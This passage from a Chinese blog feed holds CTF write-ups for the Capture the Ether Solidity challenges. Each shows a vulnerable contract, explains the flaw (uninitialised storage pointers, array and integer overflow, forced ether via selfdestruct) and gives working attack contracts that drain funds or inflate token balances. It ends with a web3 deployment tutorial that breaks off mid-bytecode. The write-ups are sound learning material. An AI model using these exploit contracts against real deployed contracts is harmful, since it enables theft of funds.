payable &#123; require(msg.value == 1 ether); owner = msg.sender; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function donate(uint256 etherAmount) public payable &#123; // amount is in ether, but msg.value is in wei uint256 scale = 10**18 * 1 ether; require(msg.value == etherAmount / scale); Donation donation; donation.timestamp = now; donation.etherAmount = etherAmount; donations.push(donation); &#125; function withdraw() public &#123; require(msg.sender == owner); msg.sender.transfer(address(this).balance); &#125;&#125; 2.分析 2.1 本题的通过要求就是需要我们将合约中的钱全部偷走，合约中能够进行转钱操作的只有withdraw函数，所以我们只有将 require(msg.sender == owner) 这个校验通过才可以将合约中所有的钱转走 2.2 合约中有结构体，这点需要注意，分析源码可知 slot0 的位置存储的是 donations（里面具体的元素的存储位置在哪，之前遇到过，推荐文献），slot1 的位置存储的是 owner；但在函数donate 中 有一个为指明存储方式的声明语句Donation donation，这个结构体的声明默认是 storage 类型的，是需要上链的，当调用此函数的时候，会覆盖其他全局变量的插槽。 2.3 这恰好为我们篡改合约所有权提供了可能性，只要将 slot1位置的值覆盖为我们自己的账户地址即可成功执行withdraw函数了 2.4 需要在 donate 函数中修改 slot1的值，通过简单的数学计算就可以了 我不知道为什么我的这个攻击合约不行 1234567891011121314151617181920212223242526272829contract Hack &#123; DonationChallenge challenge; uint256 public etherAmount; function Hack(DonationChallenge _challenge) public &#123; challenge = _challenge; &#125; function computer(uint256 _address) public returns(uint256) &#123; // 记录下我的地址，并赋值给etherAmount，方便函数的调用 etherAmount = _address; //算出我要支付多少wei return (_address / (10 ** 36)); &#125; function att() public payable &#123; //修改slot1 即 owner的值 challenge.donate(etherAmount); // 偷钱 challenge.withdraw; &#125; function getAddress() external view returns(address) &#123; return msg.sender; &#125;&#125; tips：问了同学才知道原因：①是因为没给题目合约中的donate函数发送主币，过不了donation中的语句 ②withdraw函数中的 require(msg.sender == owner);校验过不去，因为在智能合约中，谁调用withdraw，谁就是msg.sender;合约调用，那么msg.sender就是合约 这样一来 challenge.withdraw; 中的msg.sender就是 challenge，所以就会报错 在0.4的编译器中发送主币的方式是： challenge.donate.value(msg.value)(etherAmount); 12345678function att() public payable &#123; //修改slot1 即 owner的值 //// address(nameReg).call.value(1 ether)(abi.encodeWithSignature(&quot;register(string)&quot;, &quot;MyName&quot;)); challenge.donate.value(msg.value)(etherAmount); // 偷钱 // challenge.withdraw; &#125; 这样改就可以成功修改合约的所有者了 3. 解题 3.1 部署 DonationChallenge 和 Hack 合约 3.2 攻击之前，可以看到合约所有者不是本人 3.3 计算出我需要支付的费用，参数是我的账户地址 3.4 以我的账户地址为参数，计算结果为 msg.value 调用 Donation 函数，再执行 withdrawn函数，将钱取走，再验证isComplete的值 成功","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Mapping","slug":"CTFS/capther the ether/Mapping","date":"2023-04-13T07:20:10.000Z","updated":"2023-04-13T07:20:10.000Z","comments":true,"path":"2023/04/13/CTFS/capther the ether/Mapping/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/CTFS/capther%20the%20ether/Mapping/","excerpt":"","text":"Mapping1. 题目 1.1 Who needs mappings? I’ve created a contract that can store key&#x2F;value pairs using just an array. 1.2 源码： 12345678910111213141516171819pragma solidity ^0.4.21;contract MappingChallenge &#123; bool public isComplete; uint256[] map; function set(uint256 key, uint256 value) public &#123; // Expand dynamic array as needed if (map.length &lt;= key) &#123; map.length = key + 1; &#125; map[key] = value; &#125; function get(uint256 key) public view returns (uint256) &#123; return map[key]; &#125;&#125; 2. 分析 2.1 最开始题目我是不理解的，上网搜了一下之后才知道，是要让 isComplete 的值返回的 是 true ，但是我是无从下手的，源码中没有提供修改 isComplete 值的函数 2.2 去网上搜索解题过程的时候，看到了说只要让动态数组 map 溢出将原来 isComplete 所处的 slot0位置 给覆盖即可将 未赋值的 isComplete 的值转化为 true（这里还是不太理解的） 2.3 知道怎么做之后就可以分析如何实现数组的溢出 a. 一个合约的存储最大容量可以看成是一个非常大的数组，最初全是零。数组中的每个值都是 32 字节宽，并且有 2 ^256个这样的值。简单来说就是有 2^256 个 key , 每一个key可以装下 32bytes（1uint &#x3D; 1uint256&#x3D;1bytes32&#x3D;32bytes）题目说明了map 是uint256 类型的数组，也就是说，map 数组中的每一元素占用一个slot，这就说明可以不用考虑几个元素挤在一个slot的情况了 b. 动态数组在EVM上存储的位置很复杂，他会根据你动态数组声明的位置，即 slot的位置进行hash计算出索引0实际存储的位置，从而开辟一段连续的空间用于存储数据元素， 参考文献 c. 又因为数组溢出之后，又会从EVM的虚拟数组从索引为0的位置（即slot0）开始存储，就会覆盖原来合约中的数据（即isComplete），***数组的起始位置是通过keccak256(bytes32(“数组长度所在插槽”))计算*** d. 计算 slot0 的位置 ： 12 ** 256 - 1 - uint256(keccak256(slot)) + 1 2.4 攻击合约： 123456789101112131415161718192021222324252627contract Hack &#123; MappingChallenge challenge; function Hack(MappingChallenge _challenge) public &#123; challenge = _challenge; &#125; function att(uint256 slot) public&#123; // 计算出map[0]被hash后分配的位置 uint start = uint256(keccak256(slot)); //计算出start 到EVM数组末尾的长度 // 2 ** 256 - 1 ==&gt;&gt; 是EVM数组的长度 [0,2 ** 256 - 1] uint length = 2 ** 256 - 1 - start; // 此时start + length 应该是等于 2 ^ 256 // 验证了猜想 // return start + length; // 因为 2 ** 256 - 1 + 1 = 0 // return length + 1; challenge.set(length+1, 1); &#125;&#125; 3. 解题 3.1 部署 MappingChallenge合约，部署 Hack 合约 3.2 将map 所处的插槽位置作为形参，调用att函数 3.3 回到 MappingChallenge 合约中查看 isComplete的值已经变成了true","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Retirement fund","slug":"CTFS/capther the ether/Retirement fund","date":"2023-04-13T06:58:10.000Z","updated":"2023-04-13T06:58:10.000Z","comments":true,"path":"2023/04/13/CTFS/capther the ether/Retirement fund/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/CTFS/capther%20the%20ether/Retirement%20fund/","excerpt":"","text":"Retirement fund1. 题目 1.1 This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement. I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!). I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck! 翻译： 这个退休基金就是经济学家所说的承诺机制。我正在努力确保我在退休时保留 1 个以太币。 我已经向下面的合约承诺了 1 个以太币，并且在 10 年过去之前我不会撤回它。如果我提早退出，我的 10% 的以太币会流向beneficiary（你！）。 我真的不想让你拥有我的 0.1 个以太币，所以我决定在 10 年后再单独使用这些资金。祝你好运！ 1.2 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142pragma solidity ^0.4.21;contract RetirementFundChallenge &#123; uint256 startBalance; address owner = msg.sender; address beneficiary; uint256 expiration = now + 10 years; function RetirementFundChallenge(address player) public payable &#123; require(msg.value == 1 ether); beneficiary = player; startBalance = msg.value; &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function withdraw() public &#123; require(msg.sender == owner); if (now &lt; expiration) &#123; // early withdrawal incurs a 10% penalty msg.sender.transfer(address(this).balance * 9 / 10); &#125; else &#123; msg.sender.transfer(address(this).balance); &#125; &#125; function collectPenalty() public &#123; require(msg.sender == beneficiary); uint256 withdrawn = startBalance - address(this).balance; // an early withdrawal occurred require(withdrawn &gt; 0); // penalty is what&#x27;s left msg.sender.transfer(address(this).balance); &#125;&#125; 2.分析 2.1 题目的要求是将合约的钱全部取走，而不是取走合约所有者剩下的那 0.1 ether 2.2 所以我们将重点关注 collectPenalty 函数，成功执行msg.sender.transfer(address(this).balance);这行代码；而要执行这行代码执行要通过两个校验。校验一：require(msg.sender == beneficiary);验证你是否是受益人， 校验二：withdrawn = startBalance - address(this).balance &gt; 0 验证合约所有者是否提前取款了，提前取款就可以往下执行 2.3 但是我们可以通过下溢的方法让 withdrawn 的值大 0，就是让 address(this).balance 的值大于 1ehter，而合约中没有可以接收主币的函数，这就需要我们使用 selfdestruct命令，将某个合约的钱强行转给指定合约 2.4 所以我们可以编写一个攻击合约，往合约中发送一点主币，再执行自毁命令 攻击合约： 12345678contract Hack &#123; function Hack(address _address) public payable &#123; // RetirementFundChallenge retiement = RetirementFundChallenge(_address); selfdestruct(_address); &#125;&#125; 3.解题 3.1 部署 RetirementFundChallenge合约 ![image-20240412145318323](Retirement fund&#x2F;image-20240412145318323.png) 3.2 部署 Hack 合约，给 RetirementFundChallenge合约 转入 1 ether ![image-20240412145338663](Retirement fund&#x2F;image-20240412145338663.png) 3.3 调用 collecPenalt函数 ![image-20240412145351671](Retirement fund&#x2F;image-20240412145351671.png) 查看isComplete的值变成了 true ![image-20240412145405659](Retirement fund&#x2F;image-20240412145405659.png) 一段时间之后的二刷 攻击合约 1234567891011121314151617181920212223242526/** 攻击思路： 1. 先通过Helper强制给challenge合约赚钱，使得 uint256 withdrawn = startBalance - address(this).balance; 溢出 2. 通过hacker调用attack函数，完成攻击 3. 部署顺序：Hack =》 challenge =》 Helper*/contract Hack &#123; function attack(RetirementFundChallenge challenge) public &#123; challenge.collectPenalty(); require(challenge.isComplete()); tx.origin.transfer(address(this).balance); &#125; function() external payable &#123;&#125;&#125;contract Helper &#123; function Helper() public payable &#123;&#125; function selfdestruct_(address challenge) public payable &#123; selfdestruct(challenge); &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token whale","slug":"CTFS/capther the ether/Token whale","date":"2023-04-13T06:01:10.000Z","updated":"2023-04-13T06:01:10.000Z","comments":true,"path":"2023/04/13/CTFS/capther the ether/Token whale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/13/CTFS/capther%20the%20ether/Token%20whale/","excerpt":"","text":"Token whale1. 题目 1.1 要求： This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge 1.2 源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; totalSupply = 1000; balanceOf[player] = 1000; &#125; function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; event Transfer(address indexed from, address indexed to, uint256 value); function _transfer(address to, uint256 value) internal &#123; balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; function transfer(address to, uint256 value) public &#123; require(balanceOf[msg.sender] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; require(balanceOf[from] &gt;= value); require(balanceOf[to] + value &gt;= balanceOf[to]); require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; _transfer(to, value); &#125;&#125; 2. 分析 2.1 首先对代码进行解读，慢慢看懂代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778pragma solidity ^0.4.21;contract TokenWhaleChallenge &#123; address player; uint256 public totalSupply; mapping(address =&gt; uint256) public balanceOf; mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; string public name = &quot;Simple ERC20 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; function TokenWhaleChallenge(address _player) public &#123; player = _player; // 发行量是 1000 totalSupply = 1000; // 初始化玩家的代币为 1000 balanceOf[player] = 1000; &#125; // 通关要求：需要玩家的代币 &gt;= 1000000 function isComplete() public view returns (bool) &#123; return balanceOf[player] &gt;= 1000000; &#125; // 触发事件 谁向谁转了多少 value event Transfer(address indexed from, address indexed to, uint256 value); //内部的 发送函数 -- 将合约调用者的代币转移给 接收方to function _transfer(address to, uint256 value) internal &#123; // 这里减的是 合约调用者的代币 // 只要这里的msg.sender 不是 同一个地址，那么预防不了溢出这个漏洞 balanceOf[msg.sender] -= value; // 这里要注意 balanceOf[to] += value; emit Transfer(msg.sender, to, value); &#125; // 外部的交易函数，将调用者的代币发送给接收者to function transfer(address to, uint256 value) public &#123; // 确保调用者的钱足够发送 require(balanceOf[msg.sender] &gt;= value); // 这个是？？？？为了防止上溢？？？ require(balanceOf[to] + value &gt;= balanceOf[to]); _transfer(to, value); &#125; event Approval(address indexed owner, address indexed spender, uint256 value); // 授权额度 function approve(address spender, uint256 value) public &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); &#125; function transferFrom(address from, address to, uint256 value) public &#123; // 检查的是 from 这个地址的代币 // 安全隐患：相当于 小王和小李，只要小王有钱我就可以一直从小李那里取钱 require(balanceOf[from] &gt;= value); // 这个校验很容易通过，我感觉是只要不弄溢出就没事 require(balanceOf[to] + value &gt;= balanceOf[to]); // 调用 approve函数，让 from 给合约调用者授权 require(allowance[from][msg.sender] &gt;= value); allowance[from][msg.sender] -= value; // 让to 和 msg.sender不一致，破解它那简简单单的保护措施，to可以随便乱填一个地址 _transfer(to, value); &#125;&#125; 2.2 本题的目标就是 balanceOf[player] &gt;= 1000000 而合约中的代币发行量只有 1000 那么多，显然只通过简单的转账操作是不可能实现的，所以，只能往溢出的方向去思考 2.3 而合约中能产生溢出的且涉及到 balanceOf 的只有 _transfer 函数中的 balanceOf[msg.sender] -= value; 这个可以产生溢出，生成很多很多代币。 2.4 合约中调用此内部函数的方法只有 transfer 和 transferFrom 。细看可知 transfer 函数中 有require(balanceOf[msg.sender] &gt;= value)检验，这个检验让这个函数变得安全，因为它和 _transfer函数中的balanceOf[msg.sender] -= value;的msg.sender 保持一致，无法进行溢出操作 2.5 transferFrom 合约中有三个校验 12345678910// 检查的是 from 这个地址的代币 // 安全隐患：相当于 小王和小李，只要小王有钱我就可以一直从小李那里取钱 require(balanceOf[from] &gt;= value); // 这个校验很容易通过，我感觉是只要不弄溢出就没事 require(balanceOf[to] + value &gt;= balanceOf[to]); // 调用 approve函数，让 from 给合约调用者授权 require(allowance[from][msg.sender] &gt;= value); 2.6 我们可知，它校验的是from 地址 ，但是 _transfer 合约中操作的是 msg.sender 这就有了操作空间，只要别人有钱我们就可以通过校验执行以下的一系列操作 值得注意的是方法的形参的 to 不能和当前的合约调用者一致，否则他会被_transfer函数中的小小保护机制给还原回去的，我之前就试过 3. 解题 3.1 给函数填入参数 ![image-20240412145551536](Token whale&#x2F;image-20240412145551536.png) 3.2 首先要通过第一个校验：可以用玩家地址（balanceOf[play] &#x3D; 1000）作为 from ，这样就可以通过第一个校验了 ![image-20240412145558250](Token whale&#x2F;image-20240412145558250.png) 3.3 to 随便填一个地址就可以，只要不和msg.sender 是同一个地址就行 3.4 要通过第二个校验，就需要 allowance[from][msg.sender] &gt;= value ，所以需要先调用approve 函数，将调用者地址合约切回 玩家地址，spender就是 你等下要使用的msg.sender，然后随便授权，我这里授权一块钱，因为一个很简单溢出就是 0 - 1 ![image-20240412145606809](Token whale&#x2F;image-20240412145606809.png) 3.5 调用之后，查看 balanceOf[msg.sender] ![image-20240412145617600](Token whale&#x2F;image-20240412145617600.png) 3.6 再调用 transfer 函数，从 msg.sender 转 钱 给 玩家 player ![image-20240412145626133](Token whale&#x2F;image-20240412145626133.png) 通过！！！ ![image-20240412145637909](Token whale&#x2F;image-20240412145637909.png) 一段时间之后的二刷 攻击合约 1234567891011121314151617181920212223242526272829/** 攻击思路: 1. 部署Player，部署challenge，部署Hack 2. 调用 player 的attack，给hacker授权 3. 调用Hack的attack，完成攻击*/contract Player &#123; function attack(address spender, uint256 value, TokenWhaleChallenge challenge) public &#123; challenge.approve(spender, value); &#125;&#125;contract Hack &#123; TokenWhaleChallenge challenge; function Hack(address _challenge) public &#123; challenge = TokenWhaleChallenge(_challenge); &#125; function attack(address player) public &#123; challenge.transferFrom(player, player, 1000); challenge.transfer(player, 1000000); require(challenge.isComplete()); &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Token sale","slug":"CTFS/capther the ether/Token sale","date":"2023-04-12T06:01:10.000Z","updated":"2023-04-12T06:01:10.000Z","comments":true,"path":"2023/04/12/CTFS/capther the ether/Token sale/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/CTFS/capther%20the%20ether/Token%20sale/","excerpt":"","text":"Token sale1. 题目 1.1 This token contract allows you to buy and sell tokens at an even exchange rate of 1 token per ether. The contract starts off with a balance of 1 ether. See if you can take some of that away. 1.2 源码： 123456789101112131415161718192021222324252627pragma solidity ^0.4.21;contract TokenSaleChallenge &#123; mapping(address =&gt; uint256) public balanceOf; uint256 constant PRICE_PER_TOKEN = 1 ether; function TokenSaleChallenge(address _player) public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance &lt; 1 ether; &#125; function buy(uint256 numTokens) public payable &#123; require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; &#125; function sell(uint256 numTokens) public &#123; require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; msg.sender.transfer(numTokens * PRICE_PER_TOKEN); &#125;&#125; 2. 分析 2.1 分析代码可知，如果按部就班来操作（即 用相同的钱来买相同的代币是行不通的—-因为 buy 函数中的require(msg.value == numTokens * PRICE_PER_TOKEN); balanceOf[msg.sender] += numTokens; 和 sell 函数中的 require(balanceOf[msg.sender] &gt;= numTokens); balanceOf[msg.sender] -= numTokens; 限制了你存多少取多少，不能存少取多） 2.2 所以按部就班行不通，但是我们只能往存少取的方向取考虑，这就涉及了溢出的问题 2.3 以 uint8为例子，我们可以知道 在uint8 的加法中 123&gt;254 + 1 = 255&gt;254 + 2 = 0&gt;254 + 3 = 1 我在remix中尝试过，直接显示的写 uint8 = 255 + 1 是会被编译器检测出来的，但是隐式的写则不会即 12&gt;uint8 a = 255;&gt;uint8 b = a + 1; 这样输出的结果是 0； 在uint8 的乘法中 12&gt;51 * 5 = 255&gt;51 * 6 = 50 51 * 6 = 50 可以根据加法拆分为 51 * 6 = 51 * (5 + 1) = 51 * 5 + 51 = 255 + 1 + 50 = 50 我的理解是超过 255重新计数，因为uint8 的取值范围是 [0,255] 256 位，所以超过255 的部分又从 0 开始。 同理 uint256 类型也是如此，uint256的取值范围是[0,115792089237316195423570985008687907853269984665640564039457584007913129639935] 2.4 我们本着存少取多的原则，让 require(msg.value == numTokens * PRICE_PER_TOKEN); 中的 numTokens * PRICE_PER_TOKEN 发生溢出，我们就可以实现花费少的主币获取更多的代币 2.5 在合约中主币是以 wei为单位的 也就是说 uint256 constant PRICE_PER_TOKEN = 1 ether = 10^18 wei 我们就需要计算出溢出的门槛是多少 ，计算如下： 1234567//115792089237316195423570985008687907853269984665640564039457584007913129639935uint256 result = 2**256 - 1;//115792089237316195423570985008687907853269984665640564039457uint256 temp = result / 10**18;// 此时给temp 的值加 1 应该是触发溢出的最低门槛uint256 money = (temp + 1) * 10**18; //money=415992086870360064 在remix上测试得： ![image-20240412145505381](Token sale&#x2F;image-20240412145505381.png) 2.6 然后再调用buy函数的时候，以 temp+1的值作为参数传入，money的值作为msg.value ![image-20240412145523203](Token sale&#x2F;image-20240412145523203.png) 2.7 以 1 为参数调用 sell函数 ![image-20240412145532498](Token sale&#x2F;image-20240412145532498.png) 解题成功 3. 解题解题过程如上述分析 一段时间时候，二刷 攻击合约 1234567891011121314151617181920212223242526contract Hack &#123; TokenSaleChallenge challenge; function Hack(address _challenge) public payable &#123; challenge = TokenSaleChallenge(_challenge); &#125; function figure() internal pure returns (uint256) &#123; return (getMax() / 1 ether + 1) * 1 ether; &#125; function getMax() internal pure returns (uint256) &#123; uint256 zero = 0; return zero - 1; &#125; function attack() public &#123; challenge.buy.value(figure())(getMax() / 1 ether + 1); challenge.sell(1); require(challenge.isComplete()); msg.sender.transfer(address(this).balance); &#125; function() external payable&#123;&#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"web3 学习总结","slug":"Utils/Web3/web3 学习总结","date":"2023-04-12T02:47:10.000Z","updated":"2023-04-12T02:47:10.000Z","comments":true,"path":"2023/04/12/Utils/Web3/web3 学习总结/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/12/Utils/Web3/web3%20%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"","text":"web3 学习总结1. 合约的部署 – 需要发送主币，以及传入参数以一个冒泡排序合约为例 合约代码： 1234567891011121314151617181920212223242526272829303132// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract sort &#123; uint[] arr; constructor(uint[] memory arrays) payable &#123; require(msg.value == 1); arr = arrays; &#125; function bubSort() external returns(uint[] memory) &#123; bool flag; uint temp; for (uint i = 0; i &lt; arr.length - 1; i++) &#123; flag = true; for (uint j = 0; j &lt; arr.length - i - 1; j++) &#123; if(arr[j] &gt; arr[j + 1]) &#123; temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125; return arr; &#125;&#125; 1.1 在 remix 中复制合约的 ABI 和 byteCode 1.2 在 vscode 上编写代码，创建 sort.abi 和 sort.js 文件 1.3 在 根据 获取的交易哈希，在 ganache 上找到相应的合约地址 1.4 在remix 上验证部署出来的合约地址是否真实，合约中是有主币的，所以是正确的 部署合约的代码： 12345678910111213141516171819202122let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);var byteCode = &quot;0x60806040526040516106f33803806106f38339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b61043f806102b46000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063283fdc7814610030575b600080fd5b61003861004e565b60405161004591906102d9565b60405180910390f35b606060008060005b6001600080549050610068919061032a565b8110156101b8576001925060005b600182600080549050610089919061032a565b610093919061032a565b81101561019f5760006001826100a9919061035e565b815481106100ba576100b9610392565b5b9060005260206000200154600082815481106100d9576100d8610392565b5b9060005260206000200154111561018c57600081815481106100fe576100fd610392565b5b90600052602060002001549250600060018261011a919061035e565b8154811061012b5761012a610392565b5b90600052602060002001546000828154811061014a57610149610392565b5b9060005260206000200181905550826000600183610168919061035e565b8154811061017957610178610392565b5b9060005260206000200181905550600093505b8080610197906103c1565b915050610076565b50826101b85780806101b0906103c1565b915050610056565b50600080548060200260200160405190810160405280929190818152602001828054801561020557602002820191906000526020600020905b8154815260200190600101908083116101f1575b50505050509250505090565b600081519050919050565b600082825260208201905092915050565b6000819050602082019050919050565b6000819050919050565b6102508161023d565b82525050565b60006102628383610247565b60208301905092915050565b6000602082019050919050565b600061028682610211565b610290818561021c565b935061029b8361022d565b8060005b838110156102cc5781516102b38882610256565b97506102be8361026e565b92505060018101905061029f565b5085935050505092915050565b600060208201905081810360008301526102f3818461027b565b905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006103358261023d565b91506103408361023d565b9250828203905081811115610358576103576102fb565b5b92915050565b60006103698261023d565b91506103748361023d565b925082820190508082111561038c5761038b6102fb565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b60006103cc8261023d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036103fe576103fd6102fb565b5b60018201905091905056fea264697066735822122040692a2976cbd61653fb0d4195fa70c62b232f3d9b74fdf1f80f9e5bbada103c64736f6c63430008130033&quot;;// 部署合约的代码contract.deploy(&#123; data: byteCode, arguments: [[5,4,3,2,1]]&#125;).send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, gas: 4700000, value: 1&#125;,function(err,result)&#123; console.log(&quot;合约部署得到的交易哈希为：&quot;); console.log(result);&#125;) 2.1 调用合约的函数，payable函数 2.1 调用 bubSort函数，对数组进行排序 123456789101112// 调用合约函数var address = &quot;0x2A5cd706Ca94C6655197e6C05C8610CA04Ac8569&quot;;var contract = new web.eth.Contract(sortABI,address);contract.methods.bubSort().send(&#123; from: &quot;0x3C061FCEb96fca484e8c55C204BAd35C6fE2CE0f&quot;, value: 1&#125;).on(&#x27;receipt&#x27;,function(result)&#123; console.log(result);&#125;) 执行结果： 2.2 执行之后获得交易的哈希，并在ganache上查看 2.3 将交易哈希通过 remix 上的debug 来查看合约中的变量 我们可以发现，传入的数组为[5,4,3,2,1] 调用排序函数之后，数组变成了[1,2,3,4,5] 说明执行成功 2.4 完整的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041let Web3 = require(&quot;web3&quot;);web = new Web3(new Web3.providers.HttpProvider(&quot;Http://127.0.0.1:7545&quot;));var fs = require(&quot;fs&quot;);var sortABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\Web3Workspace\\\\js\\\\lesson_online\\\\temp\\\\sort.abi&quot;),toString());var contract = new web.eth.Contract(sortABI);// var byteCode = &quot;60806040526040516106e63803806106e68339818101604052810190610025919061025c565b6001341461003257600080fd5b806000908051906020019061004892919061004f565b50506102a5565b82805482825590600052602060002090810192821561008b579160200282015b8281111561008a57825182559160200191906001019061006f565b5b509050610098919061009c565b5090565b5b808211156100b557600081600090555060010161009d565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b61011b826100d2565b810181811067ffffffffffffffff8211171561013a576101396100e3565b5b80604052505050565b600061014d6100b9565b90506101598282610112565b919050565b600067ffffffffffffffff821115610179576101786100e3565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b6101a28161018f565b81146101ad57600080fd5b50565b6000815190506101bf81610199565b92915050565b60006101d86101d38461015e565b610143565b905080838252602082019050602084028301858111156101fb576101fa61018a565b5b835b81811015610224578061021088826101b0565b8452602084019350506020810190506101fd565b5050509392505050565b600082601f830112610243576102426100cd565b5b81516102538482602086016101c5565b91505092915050565b600060208284031215610272576102716100c3565b5b600082015167ffffffffffffffff8111156102905761028f6100c8565b5b61029c8482850161022e565b91505092915050565b610432806102b46000396000f3fe60806040526004361061001e5760003560e01c8063283fdc7814610023575b600080fd5b61002b61004